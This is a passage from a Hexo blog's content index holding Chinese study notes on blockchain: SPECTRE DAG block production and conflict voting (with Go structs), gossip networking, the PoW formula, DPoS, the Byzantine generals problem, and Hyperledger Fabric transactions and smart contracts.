title="如何产生区块"></a>如何产生区块</h4><p><strong>SPECTRE 协议中，当产生区块时，要从之前所有分叉的末端区块（入度为零,又称 tip）中挑选大于等于 2 个父块 hash 作为引用。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// blockNode represents a block within the DAG</span><br><span class="hljs-keyword">type</span> blockNode <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> Additions, deletions, or modifications to the order of the</span><br><span class="hljs-comment">// definitions in this struct should not be changed without considering</span><br><span class="hljs-comment">// how it affects alignment on 64-bit platforms.  The current order is</span><br><span class="hljs-comment">// specifically crafted to result in minimal padding.  There will be</span><br><span class="hljs-comment">// hundreds of thousands of these in memory, so a few extra bytes of</span><br><span class="hljs-comment">// padding adds up.</span><br><br><span class="hljs-comment">// parents are the parent block for this node.</span><br>parents []*blockNode<br><br><span class="hljs-comment">// parent metadata like version and extra data</span><br>parentMetadata []*parentInfo<br><br>parentVersion <span class="hljs-keyword">int32</span><br><br><span class="hljs-comment">// hash is the double sha 256 of the block.</span><br>hash chainhash.Hash<br><br><span class="hljs-comment">// workSum is the total amount of work in the chain up to and including</span><br><span class="hljs-comment">// this node.</span><br>workSum *big.Int<br><br><span class="hljs-comment">// height is parentsMaxHeight + 1</span><br>height <span class="hljs-keyword">int32</span><br><br><span class="hljs-comment">// Some fields from block headers to</span><br><span class="hljs-comment">// reconstruct headers from memory.  These must be treated as</span><br><span class="hljs-comment">// immutable and are intentionally ordered to avoid padding on 64-bit</span><br><span class="hljs-comment">// platforms.</span><br>version    <span class="hljs-keyword">int32</span><br>bits       <span class="hljs-keyword">uint32</span><br>nonce      <span class="hljs-keyword">uint32</span><br>timestamp  <span class="hljs-keyword">int64</span><br>merkleRoot chainhash.Hash<br><br>&#125;<br><br><span class="hljs-keyword">type</span> parentInfo <span class="hljs-keyword">struct</span> &#123;<br>hash chainhash.Hash<br>data [<span class="hljs-number">32</span>]<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>当有新区块产生时，节点要立刻将新区块(包含基于哪些区块产生这一信息)发送给与自己相连接的节点。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> DAGState <span class="hljs-keyword">struct</span> &#123;<br>Tips      []chainhash.Hash <span class="hljs-comment">// Hash of the tip blocks</span><br>Hash      chainhash.Hash <span class="hljs-comment">//Hash of the tip hashes</span><br>MinHeight <span class="hljs-keyword">int32</span><br>MaxHeight <span class="hljs-keyword">int32</span><br>BlkCount  <span class="hljs-keyword">uint32</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616914229993-778efd1e-9f02-4746-b4e6-3891fd1f7c82.png#height=303&id=MOTgK&name=image.png&originHeight=362&originWidth=848&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=243838&status=done&style=none&title=&width=710" alt="image.png"><br>该协议下，挖矿节点只<strong>负责迅速挖区块</strong>(能够达到 1 秒一个区块)，而对分叉中可能包含的冲突交易在挖矿阶段并<strong>不做任何处理</strong>，将记录交易速度最大化，让 DAG 这种区块链有着恐怖的处理交易能力。</p><h4 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h4><p>SPECTRE 的思路是设计一个计算投票的算法，让诚实区块会投票给诚实的区块，后边的诚实区块会给前边的<strong>堆叠算力</strong>，从而让恶意攻击失败，其安全算力也是<strong>51%**。<br>**算法是：</strong><br>对指定的块 z，考虑其对其他的块 x,y 的投票过程。<br>(1) 如果 z 的先行块是 x 不是 y，那么它将投票给 x。<br>(2) 如果 z 的先行块既是 x 也是 y，投票将取决于与 z 的可达块相同的虚拟块进行递归投票的结果。<br>(3) 如果 z 的先行块既不是 x 也不是 y，投票将取决于以 z 为先行块的大多数块的投票。<br>(4) 如果 z 是一个可以到达整个 DAG 的虚拟块，它将遵从 DAG 的大多数块来决定投票结果。<br>(5) 如果 z=x 或者 z=y，只要 x 与 y 之间互相不可达，它将投票给自己。<br>拿双花举例，下图中，X 和 Y 区块中包含着两条冲突交易会导致双花，此时 DAG 中的区块会对 X 和 Y 进行投票，<strong>决定哪一个交易有效。</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616918388824-cb331dd8-b883-4bff-ad05-700b10a64f28.png#height=330&id=SE4Hx&name=image.png&originHeight=447&originWidth=823&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=213757&status=done&style=none&title=&width=608" alt="image.png">  <br>投票规则如下，投 X 的标蓝，投 Y 的标红，X&lt;Y 代表 X 先于 Y：</p><ul><li>X 后边的，<strong>只能到 X 的投 X</strong>，图中 6、7、8 投 X，同理 9、10、11 投 Y。</li><li>X 后边的，<strong>能到 X 也能到 Y</strong>，根据上一次(图中虚线圈内)的投票结果投，12 投 X。</li><li>不在 X、Y 后边的，<strong>根据自己后边所有的区块投哪个票多的投</strong>，1-5 区块投 X</li><li>X、Y 投自己</li></ul><p>根据投票结果，X 中的那条交易信息<strong>有效</strong>，Y 中对应的那条交易信息<strong>无效</strong>。</p><h4 id="可信交易集合"><a href="#可信交易集合" class="headerlink" title="可信交易集合"></a>可信交易集合</h4><p><strong>SPECTRE 可信交易集就相当于超过当前 6 个区块的比特币链里组成的交易集合。</strong><br>区块链从数字加密货币的角度来说，就是一个<strong>账本</strong>，从账本上的交易信息中得出每个<strong>账户</strong>所拥有的货币，所以，得出<strong>确定的、不可能更改</strong>的交易信息就至关重要，SPECTRE 可信交易集产生过程如下：</p><ul><li>遍历区块，依次提取交易信息，<strong>无冲突交易</strong>加入无冲突交易集。</li><li>将<strong>导致账户余额不足的冲突交易</strong>加入冲突交易集。对应时空数据即相同时间的用户</li><li>根据上边的投票算法，依次对冲突交易进行<strong>投票</strong>，产生冲突区块顺序集，决定哪一条交易有效。</li><li>将投票<strong>有效</strong>的交易加入<strong>无冲突交易集</strong>。</li><li>将无冲突交易集中超过一定时间的交易组建可信交易集，即该交易池交易信息<strong>基本不可能被篡改</strong>。</li></ul><p><strong>SPECTRE 并不会对所有区块进行排序，所有区块没有一个完整的线形顺序，有的只是决定冲突信息先后的区块顺序对。</strong></p><p><strong>比特币中的高度</strong>代表的就是<strong>线形顺序</strong>，高度低的区块中交易信息<strong>先于</strong>高度高的区块里的信息，高度高的区块就不能<strong>包含和高度低的区块冲突的交易</strong>，而<strong>SPECTRE 有大量的分叉</strong>，区块高度不能代表线形顺序，前边的区块交易信息不一定先于后边的分叉区块交易信息，交易信息的<strong>有效性要由投票算法</strong>来决定。<br>区块投票算法很快，再加上它将<strong>所有分叉区块</strong>都包含进来，也就没有了比特币所面临的<strong>分叉风险</strong>(等待 6 个区块)，交易确认时间可以达到 10 秒。（我认为，一次投票的时间肯定低于 10s（即使它遍历了所有块），因此，只要投票成功，交易就被确认，因此效率非常高！）</p><h3 id="DAG-区块链通信机制"><a href="#DAG-区块链通信机制" class="headerlink" title="DAG 区块链通信机制"></a>DAG 区块链通信机制</h3><h4 id="P2P-对等网络"><a href="#P2P-对等网络" class="headerlink" title="P2P 对等网络"></a>P2P 对等网络</h4><p>见书 19 页</p><blockquote><p>似乎应该放到前置知识？</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617414711574-3c923c62-e148-45bc-874e-6da4cafcfd0a.png#height=278&id=f71iF&name=image.png&originHeight=555&originWidth=972&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=192050&status=done&style=none&title=&width=486" alt="image.png"><br>其他图详见：<a href="https://github.com/Blockchain-CN/blockchain">https://github.com/Blockchain-CN/blockchain</a></p><h4 id="网络结构及特性"><a href="#网络结构及特性" class="headerlink" title="网络结构及特性"></a>网络结构及特性</h4><p>从底层网络的角度来看，本作品的核心是基于 Gossip 协议的交易传播。这种机制意味着只要数据具有足够的权重，就能快速传播到整个网络中去。作品中的时空数据发布分五步完成：</p><ul><li>金字塔编码：通过多级金字塔编码，将时空数据划分进入多个层次，提高时空数据的细粒度；</li><li>加入 Bloom 过滤器：将编码后的数据放入 Bloom 过滤器，并使用同态加密将 Bloom 数组进行加密处理；</li><li>签名：采用自身私钥对加密结果进行签名；</li><li>Tip 选择：采用马尔科夫链蒙特卡洛（MCMC）算法随机挑选 50 个未确认的交易并将它们打包进入区块；</li><li>工作量证明（Proof of Work）：只是用于限制出块速率，防止网络堵塞。<blockquote><p>见 p28</p></blockquote></li></ul><p>注意：比特币中，如果我想转账一笔 BTC，我会发出一个交易，并广播给周围的节点，周围节点验证后，继续广播，最后被矿工收到，打包进入区块，并把区块广播出来，同样的传遍整个网络，交易生效。</p><p>而且通过比特币钱包，可以做到每次交易都更换地址，即生成不同的公钥私钥对，然后都指向同一个账户，这样可以避免被追踪。</p><h4 id="掩码认证消息"><a href="#掩码认证消息" class="headerlink" title="掩码认证消息"></a>掩码认证消息</h4><p>由于本作品的数据发布是通过没有手续费的交易，因此可以在分布式账本中自由的发送消息，该消息可以占据交易中的字段，而普通交易中该字段是被发送者的签名所占据。默认情况下，这些消息对任何人都是可见的。而本项目采用掩码认证消息（MAM）加密消息，提供基于哈希的签名认证和完整性验证。</p><h5 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h5><p>MAM 是一个附加的数据传输协议，在 DAG 上增加了发送和接受加密数据流的功能，且对设备的大小和成本没有限制。鉴于这些特性，MAM 满足了行业重要的需求，及完整性和私密性。用户可以在任意时间发布</p><blockquote><p>见 p29</p></blockquote><h1 id="写本子能用到的图"><a href="#写本子能用到的图" class="headerlink" title="写本子能用到的图"></a>写本子能用到的图</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617440689986-4ebfa454-4b06-4fdc-99d3-c5b84c27c0db.png#height=320&id=Yqb4B&name=image.png&originHeight=639&originWidth=989&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=90760&status=done&style=none&title=&width=494.5" alt="image.png"><br>见：<a href="https://ledger.jd.com/architecturedesign.html">https://ledger.jd.com/architecturedesign.html</a></p><h1 id="存储层"><a href="#存储层" class="headerlink" title="存储层"></a>存储层</h1><p>【1】trillian/google<br><a href="https://www.jianshu.com/p/61e432d121f9">https://www.jianshu.com/p/61e432d121f9</a><br><a href="https://blog.csdn.net/mutourend/article/details/113365448">https://blog.csdn.net/mutourend/article/details/113365448</a><br><a href="https://my.oschina.net/u/3843525/blog/3175914">https://my.oschina.net/u/3843525/blog/3175914</a><br>项目地址：<a href="https://github.com/google/trillian">https://github.com/google/trillian</a><br>应用示例：<a href="https://github.com/google/trillian-examples">https://github.com/google/trillian-examples</a><br>【2】<a href="https://github.com/vldmkr/merkle-patricia-trie">https://github.com/vldmkr/merkle-patricia-trie</a> 这个接口非常干净简洁，竟然没人点 star</p><p>这里有两篇解释性文档。提到了这些问题（未给出解决）：<br><a href="https://www.tangshuang.net/4097.html">区块链中，交易被如何打包进区块</a></p><ol><li>在打包开始之前，这些交易记录是以什么方式存在于网络？</li><li>打包是否会把所有交易记录打包进区块？怎么可能保证所有交易都不被遗漏？</li><li>如何防止矿工伪造交易？将伪造的交易打包进区块？</li></ol><p><a href="https://www.tangshuang.net/4117.html">区块链如何运用 merkle tree 验证交易真实性</a></p><ul><li>怎么从区块链里面查一个交易？</li><li>怎么获取 merkle 验证路径？</li><li>怎么确保网络上这个返回的验证路径不是伪造的？</li></ul><h1 id="激励层"><a href="#激励层" class="headerlink" title="激励层"></a>激励层</h1><p>为了能够把挖矿过程讲清楚，我们只拿比特币遵循的 PoW 来进行演示。</p><blockquote><p>SHA256(SHA256(version + prevHash + merkleRoot + time + currentDifficulty + nonce )) &lt; TARGET</p></blockquote><p>矿机执行上面公式，只要满足上面这个公式（执行结果为真），就算挖到矿。现在对这个公式进行解释。</p><ol><li>矿机会做一个 double sha256 的运算，运算的参数其实全部是块头里面的信息，但是因为这个时候区块还没有生成，所以这些信息是暂时保存的，如果抢到记账权，就把这些信息记录进去，因此，当你觉得一个区块的 hash 是否是作弊算出来的时候，用区块头里面的信息自己去算一遍，看看是不是能得到相同的 hash 就可以了，从一点上讲，挖矿也是不能作弊的，必须老老实实不停算</li><li>version 是当前运行矿机的客户端软件版本，每次版本升级，可能对一些参数会有影响，比如区块大小从 1M 扩容到 2M，但是对于挖矿算法而言是不变的</li><li>prevHash 是前一个区块的 hash 值</li><li>merkleRoot 是当前矿机内存里暂存的交易的 merkle 算法得到的根 hash，merkle 会在下文讲</li><li>time 是当前时间戳</li><li>currentDifficulty 是当前难度，这个当前难度是由一个公式算出来的，这个公式是 <code>currentDifficulty = diff_1_target/TARGET</code> 这个公式里面的 diff_1_target 可以认为是一个常量，在比特币客户端里面是不变的，值为 0x1d00ffff。当然，其实它也有可能变，但怎么变都差不多这个值，我们还是把它当作常量。而 TARGET 我们在下面会讲到。</li><li>nonce 是一个正整数，nonce 的值就算矿机要找的值。当矿机开始执行 double sha256 算法时，nonce 为 0，如果执行完一次，无法满足上面那个公式，那么 nonce 就自加 1，再执行一遍算法，如果不满足公式，继续加 1 再执行，就是这样一直加上去，直到找到一个 nonce 满足上面的公式，就算挖到矿。所以，这个 nonce 每一次挖矿都可能不一样，它是完全随机出现的，到底是多少完全看运气。但不管怎样，你看每个区块里面但 nonce 值，就知道矿机做了多少次运算，也就知道挖到矿有多难了。</li><li>TARGET 是用以对比的目标值，它是一个特定值，比特币的发明者希望 10 分钟产生一个区块，所以最初设计的 TARGET 就是为了让 currentDifficulty 能够到一个合适的值，保证 10 分钟一个块。但是实际情况并不可能保证 10 分钟一定出一个块，如果算力下降，时间就会加长，这时就应该调整一下难度，使出块时间尽可能恢复在 10 分钟左右。所以 2016 个区块（2 周）TARGET 就会调整一次，而如果真实的情况是产生 2016 个区块的时间超过 2 周，那么 TARGET 就会适当增加，从而使 currentDifficulty 减小，下面 2016 个区块的难度就会降低一些。相反，则提高难度。这个调整算法本文就不展开了。所以 TARGET 是一个 2016 次不变，但总体而言一直在变的值，它的目标就是让产生一个区块的时间大概在 10 分钟左右。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>共识机制概述</title>
      <link href="/2021/%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0/"/>
      <url>/2021/%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p>熟悉一下共识机制</p><a id="more"></a><h1 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h1><p>工作量证明</p><h1 id="DPOS"><a href="#DPOS" class="headerlink" title="DPOS"></a>DPOS</h1><p>DPOS 又称 Delegated Proof of Stake，即委托股权证明，最为形象地解释为：</p><blockquote><p>公司员工总数有 1000 人，每个人都持有数额不等的公司股份。每隔一段时间，员工可以把手里的票投向自己最认可的 10 个人来领导公司，其中每个员工的票权和他手里持有的股份数成正比。等所有人投完票以后，得票率最高的 10 个人成为公司的领导。如果有领导能力不胜任或做了不利于公司的事，那员工可以撤销对改领导的投票，让他的得票率无法进入前 10 名，从而退出管理层。</p></blockquote><p>在 DPoS 共识算法中，区块链的正常运转依赖于受托人(Delegates)，这些受托人是完全等价的。受托人的职责主要有：</p><ol><li>提供一台服务器节点，保证节点的正常运行；</li><li>节点服务器收集网络里的交易；</li><li>节点验证交易，把交易打包到区块；</li><li>节点广播区块，其他节点验证后把区块添加到自己的数据库；</li><li>带领并促进区块链项目的发展；<br>受托人的节点服务器相当于比特币网络里的矿机，在完成本职工作的同时可以领取区块奖励和交易的手续费。</li></ol><h2 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a>拜占庭将军问题</h2><p>拜占庭是东罗马帝国的首都，为了防御外敌入侵，周边驻扎了军队，而且每个军队都分隔很远，相互独立，将军与将军之间只能靠信差传递消息。在战争的时候，拜占庭军队内所有将军必需达成一致的共识（进攻或撤退），才有胜算把握。但是，在军队内部有可能存在叛徒，左右将军们的决定。这时候，在已知有成员叛变的情况下，其余忠诚的将军如何达成一致的协议，拜占庭问题就此形成。Lamport 证明了在理想状态下，<strong>背叛者为 m 或者更少时，将军总数只要大于 3m，忠诚的将军就可以达成一致。</strong><br>从技术上理解，<strong>拜占庭将军问题是分布式系统容错性问题</strong>。加密货币建立在 P2P 网络之上，是典型的分布式系统，类比一下，将军就是 P2P 网络中的节点，信使就是节点之间的通信，进攻还是撤退的决定就是需要达成的共识。如果某台独立的节点计算机拓机、掉线或攻击网络搞破坏，整个系统就要停止运行，那这样的系统将非常脆弱，所以容许部分节点出错或搞破坏而不影响整个系统运行是必要的，这就需要算法理论上的支撑，保证分布式系统在一定量的错误节点存在的情况下，仍然保持一致性和可用性</p><h3 id="比特币的解决方案-pow"><a href="#比特币的解决方案-pow" class="headerlink" title="比特币的解决方案-pow"></a>比特币的解决方案-pow</h3><p><strong>首先，维持周期循环，保证节点步调一致</strong>。这个世界上，最容易达成的就是时间上的共识，至少“几点见面”、“什么时候谈判”这样的问题很好解决吧，不然其他的都不用谈了。比特币有一个算法难度，会根据全网算力自动调整，以保证网络一直需要花费 10 分钟来找到一个有效的哈希值，并产生一个新区块。在这 10 分钟以内，网络上的参与者发送交易信息并完成交易，最后才会广播区块信息。拜占庭将军问题复杂在将军步调不一致，比特币杜绝了节点（将军们）无限制、无规律的发送命令的状态。<br><strong>其次，通过算力竞赛，确保网络单点广播</strong>。将军们如果有个“带头大哥”，事情就好办了。这里的“带头大哥”可以简单的竞争得来，举个极端的例子，说好的 8 点钟谈判，那么先到的就是“带头大哥”，可以拟定草稿，等其他人到了签字画押就行了。 “工作量证明”就是一种竞赛机制，算力好的节点，会最先完成一个新区块，在那一刻成为“带头大哥”。它把区块信息立即广播到网络，其他节点确认验证就是了。比特币通过时间戳和电子签名，实现了这样的功能，确保在某一个时间点只有一个（或几个，属于分叉行为）节点传输区块信息，改变了将军们互相传送的混乱。<br><strong>最后，通过区块链，使用一个共同账本</strong>。对于单个区块，上述两条已经可以达成共识了。但现在的问题是，有一个叛徒（不诚实节点）修改了前面区块的信息，计划把钱全部划归自己所有，当它广播新区块的时候，其他节点如何通过验证？如果大家手里没有一份相同的账本，肯定无法验证，问题就会陷入僵局。基于 P2P 网络的 BT 技术是成熟的，同步一个总帐是很简单的事情。网络中的节点，在每个循环周期内都是同步的，这让每个节点（将军）做决策的时候就有了共同的基础。如果每个节点都独立维护自己的账本，问题的复杂性将无法想象，这是更广泛基础上的共识。</p><h3 id="Fabric-的解决方案-DPOS"><a href="#Fabric-的解决方案-DPOS" class="headerlink" title="Fabric 的解决方案-DPOS"></a>Fabric 的解决方案-DPOS</h3><h4 id="应用程序和-Peer-节点"><a href="#应用程序和-Peer-节点" class="headerlink" title="应用程序和 Peer 节点"></a>应用程序和 Peer 节点</h4><p>当应用程序需要访问账本和链码的时候，他们总是需要连接到 Peer 节点。Hyperledger Fabric SDK 将这个操作变得非常简单，<strong>它的 API 使应用程序能够连接到 Peer 节点，调用链码生成交易，提交交易到网络</strong>，在网络中<strong>交易会被排序</strong>并且<strong>提交到分布式账本</strong>中，并且在这个<strong>流程结束的时候</strong>接收到事件。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616837772459-4b74c2e9-53d7-4720-bc70-d626e6ff8ab2.png#height=183&id=QpORK&name=image.png&originHeight=365&originWidth=877&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=89942&status=done&style=none&title=&width=438.5" alt="image.png"><br><strong><em>完整流程</em></strong><br><em>Peer 节点和排序节点，确保了账本在每个 Peer 节点上都具有最新的账本。在这个例子中，应用程序 A 连接到了 P1 并且调用了链码 S1 来查询或者更新账本 L1。P1 调用了链码 S1 来生成提案响应，这个响应包含了查询结果或者账本更新的提案。应用程序 A 接收到了提案的响应，对于查询来说，流程到这里就结束了。对于更新来说，应用程序 A 会从所有的响应中创建一笔交易，它会把这笔交易发送给排序节点 O1 进行排序。O1 会搜集网络中的交易并打包到区块中，然后将这些区块分发到所有 Peer 节点上，包括 P1。P1 在把交易提交到账本 L1 之前对交易进行验证。当 L1 被更新之后，P1 会生成一个事件，该事件会被 A 接收到，来标识这个过程结束了。</em></p><p>Peer 节点可以马上将查询的结果返回给应用程序，因为满足这个查询的所有信息都保存在 Peer 节点本地的账本副本中。Peer 节点从来不会为了应用程序的查询返回结果而去询问其他 Peer 节点的。但是应用程序还是能够连接到一个或者多个 Peer 节点来执行一个查询；比如，为了协调在多个 Peer 节点间的一个结果，或者当怀疑数据不是最新的时候，需要从不同的 Peer 节点获得更新的结果。在这个图标中，你能够看到账本查询是一个简单的三步流程。<br>更新交易和查询交易起点相同，但是有两个额外的步骤。尽管更新账本的应用程序也会连接到 Peer 节点来调用链码，但是不像查询账本的应用程序，一个独立的 Peer 节点目前是不能进行账本更新的，因为其他的 Peer 节点必须首先要同意这个变动（即达成<strong>共识</strong>）。因此，Peer 节点会返回给应用程序一个<strong>被提案过的</strong>更新，这个 Peer 节点会依据其他节点之前的协议来应用这个更新。第一个额外的步骤，也就是第四步，要求应用程序将响应的提案过的更新发送到网络中，网络中的 Peer 节点会将交易提交到它们相应的账本中。<strong>应用程序会收到排序节点打包了交易的区块，然后将他们分发到网络中所有的 Peer 节点</strong>，在区块被更新到每个 Peer 节点本地账本的副本中之前，这些区块都需要被验证。**排序流程需要一定时间来完成 (数秒钟)**，因此应用程序会被异步通知，像步骤五中展示的那样。</p><h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616830559343-3831c892-cc09-4770-ac50-bc26df6f869c.png#height=1043&id=Mui0a&originHeight=1043&originWidth=841&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=841"></p><h2 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616830724968-ce4a9503-5c10-460c-9153-fb99a9a16ac5.png#height=1084&id=preb9&originHeight=1084&originWidth=791&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=791"></p>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spatio-temporal-blockchain</title>
      <link href="/2021/Spatio-temporal-blockchain/"/>
      <url>/2021/Spatio-temporal-blockchain/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e95cabc2062a0cc2fab0012d16f65284196a9d510704a3fe7fc784d0da43c387"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blockchain </tag>
            
            <tag> 时空区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep-understanding-of-intelligent-contracts</title>
      <link href="/2021/Deep-understanding-of-intelligent-contracts/"/>
      <url>/2021/Deep-understanding-of-intelligent-contracts/</url>
      
        <content type="html"><![CDATA[<p>参考官方文档进行进一步了解。</p><a id="more"></a><h1 id="智能合约能干什么"><a href="#智能合约能干什么" class="headerlink" title="智能合约能干什么"></a>智能合约能干什么</h1><p>在各业务彼此进行交互之前，必须先定义一套通用的合约，其中包括通用术语、数据、规则、概念定义和流程。将这些合约放在一起，就构成了管理交易各方之间所有交互的<strong>业务模型</strong>。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616635791074-7552337f-87dc-42bf-b6ff-cd27525e2407.png#align=left&display=inline&height=273&name=image.png&originHeight=354&originWidth=865&size=56096&status=done&style=none&width=668" alt="image.png"><br>_智能合约用可执行的代码定义了不同组织之间的规则。_<strong><em>应用程序调用智能合约来生成被记录到账本上的交易。</em></strong><br>在<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/smartcontract/smartcontract.html#%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6">上图</a>中，我们可以看到组织  <code>ORG1</code>  和  <code>ORG2</code>  是如何通过定义一个  <code>car</code>  智能合约来实现  <code>查询</code>、<code>转移</code>  和  <code>更新</code>  汽车的。来自这些组织的应用程序调用此智能合约执行业务流程中已商定的步骤，例如将特定汽车的所有权从  <code>ORG1</code>  转移到  <code>ORG2</code>。</p><h1 id="智能合约-amp-链码"><a href="#智能合约-amp-链码" class="headerlink" title="智能合约&amp;链码"></a>智能合约&amp;链码</h1><p>通常，智能合约定义的是控制世界状态中业务对象生命周期的<strong>交易逻辑</strong>，随后该交易逻辑被打包进链码，紧接着链码会被部署到区块链网络中。可以将智能合约看成交易的管理者，而链码则管理着如何将智能合约打包以便用于部署。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616636007625-e3a83bad-d74f-4813-99b3-e3d8cf70307f.png#align=left&display=inline&height=256&name=image.png&originHeight=280&originWidth=739&size=28395&status=done&style=none&width=675" alt="image.png"><br><em>一个智能合约定义在一个链码中。而多个智能合约也可以定义在同一个链码中。当一个链码部署完毕，该链码中的所有智能合约都可供应用程序使用。</em><br>从上图中我们可以看到，<code>vehicle</code> 链码包含了以下三个智能合约：<code>cars</code>、<code>boats</code> 和 <code>trucks</code>；而 <code>insurance</code> 链码包含了以下四个智能合约：<code>policy</code>、<code>liability</code>、<code>syndication</code> 和 <code>securitization</code>。以上每种智能合约都涵盖了与车辆和保险有关的业务流程的一些关键点。在本主题中，我们将以 <code>car</code> 智能合约为例。我们可以看到，智能合约是一个特定领域的程序，它与特定的业务流程相关，而链码则是一组相关智能合约安装和实例化的技术容器。</p><h1 id="账本"><a href="#账本" class="headerlink" title="账本"></a>账本</h1><p>以最简单的方式来说，区块链记录着更新账本状态的交易，且记录不可篡改。智能合约以编程方式访问账本两个不同的部分：一个是<strong>区块链</strong>（记录所有交易的历史，且记录不可篡改），另一个是<strong>世界状态</strong>（保存这些状态当前值的缓存，是经常需要用到的对象的当前值）。<br>首先，<strong>世界状态</strong>是一个数据库，它存储了一组账本状态的<strong>当前值</strong>。通过世界状态，程序可以直接访问一个账本状态的当前值，不需要遍历整个交易日志来计算当前值。默认情况下，账本状态是以<strong>键值</strong>对的方式来表示的。因为我们可以创建、更新和删除状态，所以世界状态能够频繁更改。<br>其次，<strong>区块链</strong>是交易日志，它记录了促成当前世界状态的所有改变。交易被收集在附加到区块链的区块中，能帮助我们理解所有促成当前世界状态的改变的历史。区块链数据结构与世界状态相差甚远，因为一旦把数据写入区块链，就无法修改，它是<strong>不可篡改的</strong>。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616636373508-48190954-9980-41cb-a288-236801e4a19f.png#align=left&display=inline&height=292&name=image.png&originHeight=345&originWidth=804&size=50947&status=done&style=none&width=680" alt="image.png"><br><em>账本 L 由区块链 B 和世界状态 W 组成，其中世界状态 W 由区块链 B 决定。我们也可以说世界状态 W 是源自区块链 B。</em><br>智能合约主要在世界状态中将状态<strong>写入</strong>（put）、<strong>读取</strong>（get）和<strong>删除</strong>（delete），还可以查询不可篡改的区块链交易记录。</p><ul><li><strong>读取（get）</strong> 操作一般代表的是查询，目的是获取关于交易对象当前状态的信息。</li><li><strong>写入（put）</strong> 操作通常生成一个新的业务对象或者对账本世界状态中现有的业务对象进行修改。</li><li><strong>删除（delete）</strong> 操作代表的是将一个业务对象从账本的当前状态中移除，但不从账本的历史中移除。</li></ul><p>智能合约有许多可用的 <a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/developapps/transactioncontext.html#structure">API</a>。但重要的是，在任意情况下，无论交易创建、读取、更新还是删除世界状态中的业务对象，区块链都包含了这些操作的记录，且<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/ledger/ledger.html">记录不可更改</a> 。</p><h2 id="世界状态"><a href="#世界状态" class="headerlink" title="世界状态"></a>世界状态</h2><p>世界状态将业务对象属性的当前值保存为唯一的账本状态。这很有用，因为程序通常需要对象的当前值，如果遍历整个区块链来计算对象的当前值会很麻烦——从世界状态中可以直接获取当前值。<br><img 